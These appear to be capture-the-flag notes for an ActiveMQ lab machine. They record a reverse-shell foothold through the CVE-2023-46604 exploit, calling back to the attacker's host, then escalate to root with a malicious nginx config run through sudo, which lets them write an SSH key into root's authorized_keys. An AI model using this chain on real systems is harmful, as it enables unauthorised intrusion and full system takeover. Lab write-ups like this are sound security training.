22/tcp    - SSH
80/tcp    - HTTP (nginx 1.18.0) - ActiveMQ with basic auth
1883/tcp  - MQTT
5672/tcp  - AMQP
8161/tcp  - HTTP (Jetty) - ActiveMQ Admin with basic auth
61613/tcp - STOMP
61614/tcp - HTTP (Jetty)
61616/tcp - ActiveMQ OpenWire transport 5.15.15

https://github.com/dcm2406/CVE-Lab
https://github.com/vulncheck-oss/cve-2023-46604

Initial foothold
```
./cve-2023-46604_linux-amd64 -rhost 10.129.230.87 -rport 61616 -lhost 10.10.15.1 -lport 4444
```
![[Pasted image 20251126013917.png]]

![[Pasted image 20251126014020.png]]

https://github.com/advisories/GHSA-w7p3-hmmp-qmx6

Create Malicious Nginx Config
```
cat > /tmp/pwn.conf << 'EOF'
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
    worker_connections 768;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
EOF
```

Start Nginx with Root Privileges
```
sudo /usr/sbin/nginx -c /tmp/pwn.conf
```

Generate SSH Key Pair
```
ssh-keygen -t rsa -b 4096 -f /tmp/root_key -N ""
```

Upload Public Key to Root's authorized_keys
```
curl -X PUT http://localhost:1337/root/.ssh/authorized_keys -d "$(cat /tmp/root_key.pub)"
```

SSH as Root
```
ssh -i /tmp/root_key root@localhost
```

